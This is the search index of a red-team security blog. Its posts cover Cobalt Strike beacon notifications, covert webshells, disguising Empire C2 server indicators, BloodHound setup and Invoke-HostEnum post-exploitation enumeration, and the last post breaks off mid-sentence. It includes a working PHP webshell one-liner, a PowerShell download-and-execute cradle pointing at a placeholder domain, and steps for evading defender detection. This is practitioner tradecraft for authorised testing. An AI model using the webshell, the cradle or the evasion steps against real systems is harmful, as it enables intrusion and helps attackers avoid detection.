{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Threatexpress","text":"<p>Welcome to the Threat Express information security blog created by red teamers, penetration testers and security professionals. This blog contains security research, tools, and other red teaming related information.</p> <p>Joe Vest and James Tubberville released a book !</p>"},{"location":"#red-team-development-and-operations-zero-day-edition","title":"Red Team Development and Operations, zero-day edition","text":"<p>Find it on Amazon</p> <p> Paperback - \"Red Team Development and Operations\", Zero-Day Edition</p> <p> eBook - \"Red Team Development and Operations\", Zero-Day Edition</p> <p> B&amp;N Paperback - \"Red Team Development and Operations\", Zero-Day Edition</p> <p>or visit the book's companion website here http://redteam.guide</p>"},{"location":"#the-blog-contributors-are","title":"The blog contributors are:","text":"<ul> <li>Andrew Chiles @andrewchiles</li> <li>James Tubberville @minis_io</li> <li>Joe Vest @joevest</li> </ul>"},{"location":"#recent-posts","title":"Recent Posts","text":"Date Post January 2020 Red Team Development and Operations November 2019 Event Data Collector August 2019 C2 Agent Comparison March 2019 Git clone all organizational repos January 2019 Penetration Testing Pasties November 2018 A Deep Dive into Cobalt Strike Malleable C2 June 2018 Threat Get's a Vote: Applying a Threat-Based Approach to Security Testing May 2018 Threat Mitigation Strategies Part 2 February 2018 Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles January 2018 Threat Mitigation Strategies Part 1"},{"location":"#contributor-tweets","title":"Contributor Tweets","text":""},{"location":"archive/","title":"Archive","text":""},{"location":"archive/#2019","title":"2019","text":"<ul> <li>March 2019 - Git clone all organizational repos</li> <li>January 2019 - Penetration Testing Pasties</li> </ul>"},{"location":"archive/#2018","title":"2018","text":"<ul> <li>November 2018 - A Deep Dive into Cobalt Strike Malleable C2</li> <li>June 2018 - Threat Get's a Vote: Applying a Threat-Based Approach to Security Testing</li> <li>May 2018 Threat Mitigation Strategies and Technical Recommendations Part 2</li> <li>February 2018 - Automating Apache mod_rewrite and Cobalt Strike Malleable C2 Profiles</li> <li>January 2018 - Threat Mitigation Strategies Part 1</li> <li>January 2018 - HostEnum - Updates and Usage</li> </ul>"},{"location":"archive/#2017","title":"2017","text":"<ul> <li>October 2017 - Borrowing Microsoft MetaData and Signatures to Hide Binary Payloads</li> <li>September 2017 - Install BloodHound on Ubuntu</li> <li>May 2017 - [Empire - Modifying Server C2 Indicators(threatexpress/2017/empire-modifying-server-c2-indicators/)</li> <li>May 2017 - invoke-hostenum - A PowerShell Host Situational Awareness Tool</li> <li>March 2017 - Leveraging Expired Domains for Red Team Engagements</li> </ul>"},{"location":"archive/#2016","title":"2016","text":"<ul> <li>December 2016 - Slack Notifications for Cobalt Strike</li> <li>October 2016 - SubShell and TinyShell - Custom Covert Webshells</li> <li>September 2016 - New Information Security and Red Teaming Blog Threat Express by MINIS</li> </ul>"},{"location":"contributors/","title":"Contributors","text":""},{"location":"contributors/#andrew-chiles","title":"Andrew Chiles","text":"<p>Twitter: @andrewchiles</p> <p></p> <p>Andrew is a red teamer and security researcher. He's worked in information security since 2009 in various federal, defense and commercial settings. He's earned degrees in M.E. Information Assurance and B.S. Telecommunications Systems Management in addition to holding industry certifications such as OSCP, CISSP, and CCNA.</p>"},{"location":"contributors/#james-tubberville","title":"James Tubberville","text":"<p>Twitter: @minis_io</p> <p></p> <p>James Tubberville has held a number of technical positions and management roles over a 19 year career focused on system, network, application and information security. James is a former member and lead for a NSA certified Red Team and has conducted threat computer network operations, red teaming, penetration testing, and physical security assessments for a variety of commercial and government customers. As a security professional, James has achieved numerous information technology and security related certifications and awards. James is also an original author for the SANS SEC564: Red Team Operations and Threat Emulation course and a co-founder of the security consulting company MINIS that merged with SpecterOps in 2017.</p>"},{"location":"contributors/#joe-vest","title":"Joe Vest","text":"<p>Twitter: @joevest</p> <p></p> <p>Joe Vest has worked in the information technology industry for over 17 years with a focus on red teaming, penetration testing and application security. Joe is an original author of the SANS Red Team Operations and Threat Emulation course (SEC-564). As a former technical lead for a DoD red team, he has extensive knowledge of cyber threats and their tools, tactics and techniques, including threat emulation and threat detection. Joe was a co-founder of the security consulting company MINIS LLC that has since merged with SpecterOps in 2017. As a leading security professional, he has achieved numerous security certifications: OSCP, CISSP-ISSMP, CISA, GPEN, GCIH, GWAPT, CEH, Security+</p>"},{"location":"blogs/2016/new-information-security-red-teaming-blog-threat-express-minis/","title":"New Information Security and Red Teaming Blog \"Threat Express\" by MINIS","text":"<p>Andrew Chiles | September 30, 2016 | Tweet This Post: </p> <p>Welcome to the Threat Express information security blog by the Red Team at MINIS LLC. The primary website remains , but this is our new platform for the release of security research, tools, and other Red Teaming related information.</p> <p>Tools will be posted at https://github.com/minisllc.</p> <p>Stay tuned!</p> <p></p>"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/","title":"Slack Notifications for Cobalt Strike","text":"<p>Andrew Chiles | December 5, 2017 | Tweet This Post: </p> <p>We've seen several great incoming agent/shell notification mechanisms for Metasploit and Empire recently and the utility of being notified when new shells appear is without question. This is especially true when conducting phishing and social engineering style attacks or while waiting for a persistence mechanism to trigger. A recent example is SlackShellBot by @Ne0nd0g. We really like it, but often use Cobalt Strike heavily and thus need another notification method for CS.</p> <p>Enter Aggressor script. This is just one quick example of performing Slack notifications for Cobalt Strike using Aggressor. If you're a regular CS user, we highly recommend spending some time with Aggressor scripting to step up your automation and workflows. @armitagehacker has a comprehensive post of Aggressor resources that is a great starting point.</p> <p></p> <p>New Beacon Slack Notifications</p> <p>Requirements:</p> <ul> <li>This method relies on a custom web-hook just as SlackShellBot. Refer the official documentation if you need a quick guide on creating one</li> <li>A Python module for Slack integrations called \"slackweb\"</li> <li>Using pip: <code>pip install slackweb</code></li> </ul>"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-1-create-your-custom-slack-webhook","title":"Step 1: Create your Custom Slack Webhook","text":"<p>Slack Custom Webhook Configuration</p>"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-2-create-a-python-script-to-post-the-slack-notifications","title":"Step 2: Create a Python script to post the Slack notifications","text":"<p>This Python code is a basic example of using the slackweb module to submit a Slack text notification to our custom webhook. Don't forget to make the script executable!</p> <pre><code>#! /usr/bin/env python\n# slacknotifcation.py\n\nimport argparse\nimport slackweb\nimport socket\n\nparser = argparse.ArgumentParser(description='beacon info')\nparser.add_argument('--computername')\nparser.add_argument('--internalip')\nparser.add_argument('--username')\n\nhostname = socket.gethostname()\n\nargs = parser.parse_args()\n\nslackUrl = \"https://hooks.slack.com/services/...\"\ncomputername = args.computername\ninternalip = args.internalip\nusername = args.username\n\nslack = slackweb.Slack(url=slackUrl)\nmessage = \"New Beacon: {}@{} ({}) on {}\".format(username,computername,internalip,hostname)\nslack.notify(text=message)\n</code></pre>"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#_1","title":"Slack Notifications for Cobalt Strike","text":""},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-3-create-the-aggressor-script","title":"Step 3: Create the Aggressor script","text":"<p>Save the following code as a new Aggressor script. You can customize the desired information and format of the Slack notification here. The format provided in this example is \"New Beacon: USERNAME@HOSTNAME (IP ADDRESS) on C2SERVERHOSTNAME\"</p> <p>Note</p> <p>You could also modify this Aggressor script to use curl and eliminate the need for Python and an additional module entirely! However, Python allows us to quickly grab the hostname of the C2 server and easily track what assessment/campaign the incoming beacons are associated with.</p> <pre><code># Issue initial commands upon new beacon checkin\n# slacknotification.cna\n\non beacon_initial {\n    println(\"Initial Beacon Checkin: \" . $1 . \" PID: \" . beacon_info($1,\"pid\"));\n    local('$internalIP $computerName $userName');\n    $internalIP = replace(beacon_info($1,\"internal\"),\" \",\"_\");\n    $computerName = replace(beacon_info($1,\"computer\"),\" \",\"_\");\n    $userName = replace(beacon_info($1,\"user\"),\" \",\"_\");\n    $cmd = '/path/to/slacknotification.py --computername ' . $computerName . \" --internalip \" . $internalIP . \" --username \" . $userName;\n\n    println(\"Sending Slack Notification: \" . $cmd);\n    exec($cmd);\n    }\n}\n</code></pre>"},{"location":"blogs/2016/slack-notifications-for-cobalt-strike/#step-4-load-the-aggressor-script-into-cobalt-strike","title":"Step 4: Load the Aggressor script into Cobalt Strike","text":"<p>The Aggressor script can be loaded into CS via the GUI or headless mode. Once loaded, fire off some beacons and watch the notifications come in!</p> <p>Hopefully this post is useful and let us know if you have additional ideas or improvements!</p>"},{"location":"blogs/2016/web-shells-covert-channel/","title":"SubShell and TinyShell - Custom Covert Webshells","text":"<p>Joe Vest | October 3, 2016 | Tweet This Post: </p> <p></p> <p>Web applications continue to be a valuable door for attackers to use to gain remote access to a network. If a web application is compromised, the webserver itself can be used to enable a command and control (C2) channel and provide a platform for post exploitation. The use of web shells is a common method to provide this capability. Like other malicious code, security protections must be considered and understood to bypass their protections. Specific Tools, tactics and procedures (TTPs) must be designed into a web shell to minimize detection. Many current web shells have no protection against common network security defenses.</p> <p>This post discusses the use of web shells for post exploitation and as a covert channel for use during penetration tests or red team engagements, how to minimize the risk of detection and the pros and cons of using web-shells.</p> <p>I developed two web shell frameworks \u2013 SubShell and TinyShell</p> <p>Before I discuss these web shells, here is a quick overview of a web shell.</p>"},{"location":"blogs/2016/web-shells-covert-channel/#what-is-a-web-shell","title":"What is a web shell?","text":"<p>Server side code that acts as a non-interactive 'shell', remote administration tool or control panel allowing a user to issue remote commands to be executed by a web server.</p> <p>Simply put, a web shell is a page that runs commands directly on the web server on behalf of the requestor.</p>"},{"location":"blogs/2016/web-shells-covert-channel/#why-use-a-web-shell","title":"Why use a web shell?","text":"<ul> <li>Web Applications can be a valuable door into a network and are often your first network foothold outside of social engineering</li> <li>Provides remote code execution into a network</li> <li>On demand. No regular polling or beaconing makes C2 harder to detect</li> </ul>"},{"location":"blogs/2016/web-shells-covert-channel/#how-do-you-use-a-web-shell","title":"How do you use a web shell?","text":"<ul> <li>Exploit or compromise a web server, i.e.:</li> <li>Application flaw</li> <li>File upload flaw</li> <li>RFI (remote file include)</li> <li>Direct access to application source</li> </ul>"},{"location":"blogs/2016/web-shells-covert-channel/#example","title":"Example","text":"<p>Here is a simple PHP shell that uses the system function to execute OS commands.</p> <pre><code>&lt;?php echo(system($_GET[\"q\"])); ?&gt;\n</code></pre> <p>When an HTTP GET is sent to the URL hosting this page, the parameter \"q\" will be executed by the web server's OS.</p> <p></p>"},{"location":"blogs/2016/web-shells-covert-channel/#subshell-and-tiny-shell","title":"Subshell and Tiny Shell","text":""},{"location":"blogs/2016/web-shells-covert-channel/#why-were-these-frameworks-built","title":"Why were these frameworks built?","text":"<p>These projects were born out of the need for a consolidated webshell framework. There are numerous available, but I wanted to create a framework that supports numerous web languages, common features, and a common backend.</p> <p>These projects use the principle of hiding in plain sight with a goal of minimizing attention. Like numerous malicious tools, they are easy for defenders to find when they begin to look. These projects are designed to be stealthy by minimizing the triggering of defenses such as IDS, Firewall, AV etc.</p> <p>When performing penetration tests or red team engagements, \"hacking to get caught\" can be part of the test. Sometimes you want to be caught, sometimes you don't. A good security tester can control when or how their tools are exposed.</p>"},{"location":"blogs/2016/web-shells-covert-channel/#how-have-i-been-caught","title":"How have I been caught?","text":"<p>These are some mistakes or tools choices that allowed me to get caught by blue/defense teams. Most of the time this was caused by using untested tools that were not designed to be stealthy.</p> <ul> <li>Default User Agent strings</li> <li>OS commands in HTTP logs via GET requests</li> <li>Clear text OS commands moving across the wire</li> <li>Clear text binaries moving across the wire (MZ header)</li> <li>Doing too much too quick</li> </ul>"},{"location":"blogs/2016/web-shells-covert-channel/#how-does-subshell-or-tinyshell-help-control-getting-caught","title":"How does SubShell or Tinyshell help control getting caught?","text":"<ul> <li>POST requests to minimize data written web logs</li> <li>Encoding and traffic blending to help avoid clear text detection</li> <li>Console interface forces a slow down when issuing commands. Use of a webshell should be deliberate and focused. Numerous connections may attract attention.</li> <li>Customization of user-agent to help blend in.</li> <li>Valid 404 errors displayed when attempting to connect to shell without 'authentication' information.</li> </ul>"},{"location":"blogs/2016/web-shells-covert-channel/#initial-design-considerations","title":"Initial design considerations","text":"<ul> <li>Minimize attention</li> <li>Single command and control server</li> <li>Multiple version</li> <li>Safe to use without SSL</li> <li>Requests/Responses must be obfuscated or encrypted</li> <li>File browsing</li> <li>File Upload/Download</li> <li>Command execution</li> <li>HTTP POST Requests used for C2 traffic</li> <li>Invalid request render a valid 404 response</li> </ul> <p>For more details, check out the tools in the MINIS repository or watch my Bsides talk on webshells</p>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/","title":"Empire \u2013 Modifying Server C2 Indicators","text":"<p>Andrew Chiles | May 14, 2017 | Tweet This Post: </p>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#overview","title":"Overview","text":"<p>This post is intended as a follow-on to Jeff Dimmock's detailed write-up on creating communication profiles for Empire. Empire 1.6's \u201cDefaultProfile\u201d setting for modifying C2 indicators doesn't directly allow modification of the server-side parameters. When faced with an experienced group of defenders, default C2 server indicators can quickly reveal your infrastructure. HTTPS listeners with valid certificates can certainly hinder traffic monitoring, but isn't a silver bullet.</p> <p>A good example of identifying Empire infrastructure is detailed in a Chokepoint post using Shodan and Scans.io scan data. They included a Python script that idenfitied an Empire server based on a cookie handling error, but the bug was fixed in a subsequent commit. This is just another reason to protect your infrastructure from probing using redirectors with Apache mod_rewrite as Jeff also explained. Nevertheless, the steps for identifying a default configured Empire server are fairly trivial and we wanted to be able to change them! We explored the ability to modify Empire 1.6 server side C2 indicators without breaking agent functionality.</p>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#server-parameters","title":"Server Parameters","text":"<ul> <li>Staging URIs</li> <li>Default: index.asp,index.jsp,index.php</li> </ul> <p>Note</p> <p>How likely are asp, jsp, and php to exist together on the same web server? Payload staging is typically easy to identify no matter the C2 technology, but we can improve on Empire's default staging behavior.</p> <p> Empire \u2013 Default Staging URIs</p> <ul> <li>Server technology</li> <li>Default: Microsoft-IIS/7.5</li> <li>Server content</li> <li>Default: \u201cIt works!\u201d</li> </ul> <p></p>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#empire-modification","title":"Empire Modification","text":"<p>We'll continue Jeff's original example by porting some of the additional server side parameters in the Bing Search Malleable C2 profile to Empire.</p> <p>Note</p> <p>The following modifications are applicable to Empire 1.6. Empire 2.0 utilizes Flask and some of these settings will need to be changed elsewhere if you're running 2.0 beta.</p>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#modifying-the-staging-uris-and-server-header","title":"Modifying the staging URIs and Server header","text":"<p>The easiest way to update the server's default behavior is through the setup*database.py script. _Disclaimer:* These steps assume you're building up your server from scratch and aren't running an active engagement. You could also update the sqlite database directly if you don't want to blow away your existing database.</p> <p>First, remove your existing Empire database</p> <pre><code>rm /data/empire.db\n</code></pre> <p>Next, edit /setup/setup_database.py</p> <pre><code># /setup/setup_database.py\n\n# the resource requested by the initial launcher\n#STAGE0_URI = \"index.asp\"\nSTAGE0_URI = \"login\"\n\n# the resource used by the RSA key post\n#STAGE1_URI = \"index.jsp\"\nSTAGE1_URI = \"home\"\n\n# the resource used by the sysinfo checkin that returns the agent.ps1\n#STAGE2_URI = \"index.php\"\nSTAGE2_URI = \"news\"\n\n# the default delay (in seconds) for agent callback\n# DEFAULT_DELAY = 5\nDEFAULT_DELAY = 10\n\n# the default jitter (0.0-1.0) to apply to the callback delay\n#DEFAULT_JITTER = 0.0\nDEFAULT_JITTER = 0.5\n\n# the default traffic profile to use for agent communications\n# format -&gt; requestUris|user_agent|additionalHeaders\n#DEFAULT_PROFILE = \"/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\"\nDEFAULT_PROFILE = \"/search?q=news&amp;go=Search&amp;qs=bs&amp;form=QBRE,/search?q=weather&amp;go=Search&amp;qs=bs&amp;form=QBRE,/search?q=movie%20tickets&amp;go=Search&amp;qs=bs&amp;form=QBRE,/search?q=unit%20conversion&amp;go=Search&amp;qs=bs&amp;form=QBRE|Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko|Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8|Cookie:DUP=Q=GpO1nJpMnam4UllEfmeMdg2&amp;T=283767088&amp;A=1&amp;IG\"\n\n# the server version to appear as\n#SERVER_VERSION = \"Microsoft-IIS/7.5\"\nSERVER_VERSION = \"Microsoft-IIS/8.5\"\n</code></pre> <p>Finally, setup the new database and restart Empire</p> <pre><code>./setup/setup_database.py\n./empire\n</code></pre>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#results","title":"Results","text":"<p>Notice we now have new staging URI's that don't stick out quite as much and the new client communication profile is also in use. The staging request length's don't change however so there is still plenty to signature.</p> <p> Empire \u2013 Custom Bing Search Profile w/ Modified Staging URIs</p>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#modifying-the-default-page","title":"Modifying the default page","text":"<p>You can modify the default HTML displayed upon a GET request in lib/common/http.py within the \u201cdefault_page()\u201d function.</p> <p>Edit lib/common/http.py</p> <pre><code># lib/common/http.py\n\"\"\"\n\nHTTP related methods used by Empire.\n\nIncludes URI validation/checksums, as well as the base\nhttp server (EmpireServer) and its modified request\nhandler (RequestHandler).\n\nThese are the first places URI requests are processed.\n\n\"\"\"\n\nfrom BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer\nfrom SocketServer import ThreadingMixIn\nimport BaseHTTPServer, threading, ssl, os, string, random\nfrom pydispatch import dispatcher\nimport re\n\n# Empire imports\nimport encryption\nimport helpers\n#TODO: place this in a config\ndef default_page():\n\"\"\"\nReturns the default page for this server.\n\"\"\"\n# Change the default look and redirect requests to a targeted resource (i.e. Organization portal, website, etc)\n#page = \"&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"refresh\" content=\"0; url=http://www.bing.com/search\"/&gt;&lt;/head&gt;&lt;/html&gt;\"\n\n# Return some basic Bing Search content\n\npage = \"\"\"&lt;!DOCTYPE html&gt;&lt;html lang=\"en\" xml:lang=\"en\" xmlns=\"http://www.w3.org/1999/xhtml\" xmlns:Web=\"http://schemas.live.com/Web/\"&gt;&lt;script type=\"text/javascript\"&gt;//&lt;![CDATA[\n    si_ST=new Date;\n    //]]&gt;&lt;/script&gt;\n    &lt;head&gt;&lt;!--pc--&gt;&lt;title&gt;Search - Bing&lt;/title&gt;&lt;meta content=\"text/html; charset=utf-8\" http-equiv=\"content-type\" /&gt;&lt;link href=\"/search?format=rss&amp;q= &amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq= &amp;sc=8-4&amp;sk=&amp;cvid=86384E39A0DC4E01BDC606F982540419\" rel=\"alternate\" title=\"XML\" type=\"text/xml\" /&gt;&lt;link href=\"/search?format=rss&amp;q= &amp;qs=n&amp;form=QBLH&amp;sp=-1&amp;pq= &amp;sc=8-4&amp;sk=&amp;cvid=86384E39A0DC4E01BDC606F982540419\" rel=\"alternate\" title=\"RSS\" type=\"application/rss+xml\" /&gt;&lt;link href=\"/sa/simg/bing_p_rr_teal_min.ico\" rel=\"shortcut icon\" /&gt;&lt;script type=\"text/javascript\"&gt;//&lt;![CDATA[\n    _G={ST:(si_ST?si_ST:new Date),Mkt:\"en-US\",RTL:false,Ver:\"19\",IG:\"9C0DE865AEED4CEFB65F1D19E0EE4511\",EventID:\"77EF28E2D73B45CE9C515CDE44BF2532\",V:\"web\",P:\"SERP\",DA:\"DB5\",SUIH:\"0InL-dxZ9p-UKoWZWyKO6A\",gpUrl:\"\\/fd\\/ls\\/GLinkPing.aspx?\" }; _G.lsUrl=\"/fd/ls/l?IG=\"+_G.IG ;curUrl=\"http:\\/\\/www.bing.com\\/search\";function si_T(a){ if(document.images){_G.GPImg=new Image;_G.GPImg.src=_G.gpUrl+'IG='+_G.IG+'&amp;'+a;}return true;};0;0;\n    //]]&gt;&lt;/script&gt;&lt;/head&gt;\n    &lt;/html&gt;\n\"\"\"\nreturn page\n</code></pre> <p>Restart Empire with your new server C2 parameters</p> <p><code>./empire</code></p>"},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#results_1","title":"Results","text":""},{"location":"blogs/2017/empire-modifying-server-c2-indicators/#summary","title":"Summary","text":"<p>The ability to modify the network indicators of your C2 technology is critical for a threat representative engagement. While Empire doesn't expose all desired possibilities with the \u201cDefaultProfile\u201d configuration setting, a little exploration into the source reveals more flexibility. Never be afraid to dive into a tool's source and modify it to suit your needs. There are still many ways to signature this traffic and beaconing activity. However, by implementing these modifications your C2 won't completely match the out-of-the-box Empire look and will raise the bar slightly for the Blue guys ;).</p>"},{"location":"blogs/2017/install-bloodhound-ubuntu/","title":"Installing BloodHound on Ubuntu - A Quick Reference Guide","text":"<p>Joe Vest | October 9, 2017 | Tweet This Post: </p> <p></p> <p>This post is intended as a quick reference guide to install Bloodhound on an Ubuntu system.</p> <p>This is heavily based on https://popped.io/setting-up-bloodhound-on-debian-jessie/ with a few tweaks.</p>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#install-ubuntu","title":"Install Ubuntu","text":"<p>Install Ubuntu as you normally would. In this case Xubuntu 16.04 was installed in VMWare</p>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#optional-install-vm-tools","title":"Optional \u2013 Install VM Tools","text":"<pre><code>sudo apt-get update\nsudo apt-get upgrade\nsudo apt-get install open-vm-tools open-vm-tools-desktop\nreboot\n</code></pre>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#install-neo4j","title":"Install Neo4j","text":"<pre><code>sudo apt-get install wget curl git\n\nwget -O - https://debian.neo4j.org/neotechnology.gpg.key | sudo apt-key add -\necho 'deb http://debian.neo4j.org/repo stable/' | sudo tee /etc/apt/sources.list.d/neo4j.list\necho \"deb http://httpredir.debian.org/debian jessie-backports main\" | sudo tee -a /etc/apt/sources.list.d/jessie-backports.list\n\nsudo apt-get update\nsudo apt-get install openjdk-8-jdk openjdk-8-jre\nsudo apt-get install neo4j\necho \"dbms.active_database=graph.db\" &gt;&gt; /etc/neo4j/neo4j.conf\necho \"dbms.connector.http.address=0.0.0.0:7474\" &gt;&gt; /etc/neo4j/neo4j.conf\necho \"dbms.connector.bolt.address=0.0.0.0:7687\" &gt;&gt; /etc/neo4j/neo4j.conf\necho \"dbms.allow_format_migration=true\" &gt;&gt; /etc/neo4j/neo4j.conf\n</code></pre>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#get-bloodhound-db-for-neo4j","title":"Get Bloodhound DB for neo4j","text":"<pre><code>git clone https://github.com/adaptivethreat/BloodHound.git\ncd BloodHound\nmkdir /var/lib/neo4j/data/databases/graph.db\ncd BloodHound/\ncp -R BloodHoundExampleDB.graphdb/* /var/lib/neo4j/data/databases/graph.db\nneo4j start\n</code></pre>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#verify-neo4j-is-running-on-7474-and-7687","title":"Verify neo4j is running on 7474 and 7687","text":"<pre><code>netstat -lantp\n</code></pre>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#change-neo4j-password","title":"Change neo4j password","text":"<p>Logon to http://localhost:7474 with neo4j:neo4j and change the password</p>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#get-bloodhound-binary","title":"Get Bloodhound binary","text":"<p>Download the appropriate binary from</p>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#run-bloodhound","title":"Run Bloodhound","text":"<pre><code>./Bloodhound\n</code></pre> <p>Supply the user \"neo4j\" and your newly created password. Happy hunting!</p>"},{"location":"blogs/2017/install-bloodhound-ubuntu/#references","title":"References:","text":""},{"location":"blogs/2017/invoke-hostenum/","title":"HostEnum - A PowerShell Host Situational Awareness Tool","text":"<p>Andrew Chiles | May 2, 2017 | Tweet This Post: </p>"},{"location":"blogs/2017/invoke-hostenum/#overview","title":"Overview","text":"<p>During a Red Team engagement, performing detailed Situational Awareness (SA) or enumeration on initial and subsequent host compromises is vital. Every good pen-tester or red teamer has their list of go-to scripts, commands, or \"pasties\" to run once initial shell access is achieved. The goal is to quickly learn as much about your environment as possible; including defenses, system configuration, interesting files, and opportunities for persistence and lateral movement. Moreover, when working in large and/or distributed teams, a common tool-base and procedure set is crucial to ensure that necessary enumeration is accomplished no matter who's behind the keyboard.</p> <p>The first shell is often achieved on a host running the Microsoft Windows Operating System after a phishing/social-engineering attack or Web Application exploit. This makes PowerShell an excellent choice for automating post-exploitation and SA tasks. Invoke-HostEnum is a PowerShell 2.0 compatible enumeration script intended to be executed through a remote access capability such as Cobalt Strike's Beacon, Empire, or even a web-shell. All output is pre-formatted into Tables or Lists and converted to a string before returning results for this reason. Earlier internal versions of the script contained many more privilege escalation checks, but the continued development and robustness of PowerUp made these mostly redundant.</p> <p>There are several good examples of PowerShell host enumeration tools including HostRecon by Beau Bullock and Invoke-WinEnum in PowerShell Empire. Invoke-HostEnum borrows functions from these and other modules annotated throughout its source. There was a similarly named Invoke-HostEnum function in PowerView that was removed in 2015, but this is not a resurrected version.</p> <p>I've started to remove many (but not all) binary dependencies to avoid triggering potential alerts from running numerous common built-in Windows command-line enumeration tools in rapid succession. However, there is always room for improvement and contributions and suggestions to the Github repository are highly encouraged!</p>"},{"location":"blogs/2017/invoke-hostenum/#features","title":"Features","text":"<p>The following is a comprehensive list of the items currently enumerated by Invoke-HostEnum. Some enumerations functions require local administrator rights for best results and will result in no or limited results when run under a limited user context.</p> <ul> <li>OS Details, Hostname, Uptime, Installdate, Architecture</li> <li>Installed Applications and Patches</li> <li>Network Adapter Configuration, Network Shares, Connections, Routing Table, DNS Cache</li> <li>Running Processes (with full command line) and Installed Services</li> <li>Interesting Registry Entries (SNMP strings, Saved Putty Sessions)</li> <li>Local Users, Groups, and Administrators</li> <li>Personal Security Product Status</li> <li>Interesting file locations (Current User Profile) and keyword searches via file indexing</li> <li>Recycle Bin Contents</li> <li>Interesting Windows Logs (Get-ComputerDetails \u2013 Logon Events, AppLocker logs, PowerShell logs, RDP servers)</li> <li>Basic Domain enumeration (users, groups, trusts, domain controllers, account policy, SPNs)-Explicit Credential Logons (Event ID 4648)</li> </ul> <p>As usual, you can get the latest version of tools on our GitHub repository.</p>"},{"location":"blogs/2017/invoke-hostenum/#usage","title":"Usage","text":""},{"location":"blogs/2017/invoke-hostenum/#command-line","title":"Command Line","text":"<p>Execute locally hosted script with console output</p> <pre><code>powershell -ep bypass -c Import-Module ./Invoke-HostEnum.ps1; Invoke-HostEnum -Local -Domain\n</code></pre> <p>Download and execute remotely hosted script</p> <pre><code>powershell -nop -c IEX (New-Object Net.Webclient).downloadstring(\"\"\"http://yourdomain/Invoke-HostEnum.ps1\"\"\");Invoke-HostEnum -Local\n</code></pre> <p>Execute locally hosted script with HTML report output. If you want the mostly easily readable format and don't mind writing a file to disk, consider using the \"-Path\" option to specify a directory for an HTML formatted report</p> <pre><code>powershell -ep bypass -c Import-Module ./Invoke-HostEnum.ps1; Invoke-HostEnum -Local -Path c:programdata\n</code></pre> <p> Invoke-HostEnum HTML Report</p>"},{"location":"blogs/2017/invoke-hostenum/#cobalt-strike","title":"Cobalt Strike","text":"<p>Import script and execute interactively in a Beacon console</p> <pre><code>powershell-import ./scripts/Invoke-HostEnum.ps1\npowershell Invoke-HostEnum -Local -Domain\n</code></pre> <p>Automatic execution \u2013 Use aggressor script to fire upon new beacon arrivals. This is ideal to implement on your initial interactive/phishing callback Team Server where you want to gather information in the target environment and may be away from the console. Consider combining with a Slack notification script as described in our previous post Slack Notifications for Cobalt Strike or as thoroughly explained by Jeff Dimmock in Slack Bots for Trolls and Work. Note: This code would require slight modification to work for DNS beacons if desired.</p> <pre><code>on beacon_initial {\n    enumerate($1);\n}\n\nsub enumerate {\n    if ( -exists script_resource(\"scripts/Invoke-HostEnum.ps1\")) {\n    binput($1,\"[*] Executing Invoke-HostEnum\");\n    bpowershell_import($1, script_resource(\"scripts/Invoke-HostEnum.ps1\"));\n    bpowershell($1, \"Invoke-HostEnum -Local -Domain\");\n    }\n    else {\n    berror($1, \"Invoke-HostEnum.ps1 does not exist\");\n    }\n}\n</code></pre> <p> Invoke-HostEnum Execution in Cobalt Strike</p>"},{"location":"blogs/2017/invoke-hostenum/#powershell-empire","title":"PowerShell Empire","text":"<p>I've also created a basic post-exploitation module for Empire (hostenum.py) that makes executing on an Empire agent extremely easy.</p> <p>Copy scripts to the appropriate Empire path</p> <pre><code>cp Invoke-HostEnum.ps1 /data/module_source/situational_awareness/host\ncp hostenum.py /lib/modules/situational_awareness/host\n</code></pre> <p>Start Empire</p> <pre><code># ./empire\n</code></pre> <p>Interact with agent</p> <pre><code>(Empire) &gt; interact\n</code></pre> <p>Execute the module</p> <pre><code>(Empire: BX1HBE3MZAWGF1BB) &gt; usemodule situational_awareness/host/hostenum\n(Empire: situational_awareness/host/hostenum) &gt; run\n</code></pre> <p> Invoke-HostEnum Empire Module</p>"},{"location":"blogs/2017/invoke-hostenum/#credits","title":"Credits","text":"<p>Several functions are inspired or pulled directly from the following projects and are referenced in the code where applicable. Any omissions are not intentional. Thanks to the following authors and projects for the great work!</p>"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/","title":"Leveraging Expired Domains for Red Team Engagements","text":"<p>Andrew Chiles | March 1, 2017 | Tweet This Post: </p>"},{"location":"blogs/2017/leveraging-expired-domains-for-red-team-engagements/#overview","title":"Overview","text":"<p>Domain name selection is an important aspect of preparation for phishing scenarios, penetration tests, and especially Red Team engagements. It is increasingly common to be faced with web filtering in a network based on domain reputation and categorization. Often traffic to very new and/or uncategorized domains is completely blocked by such appliances \u2013 stopping your phishing payload or C2 agent in their tracks. There's been a lot of talk about Domain Fronting and High Trust Redirectors in the security community lately to deal with this same issue, but that's an extra layer of configuration and complexity that's probably not necessary for every engagement. See MDSec \u2013 Domain Fronting via Cloudfront 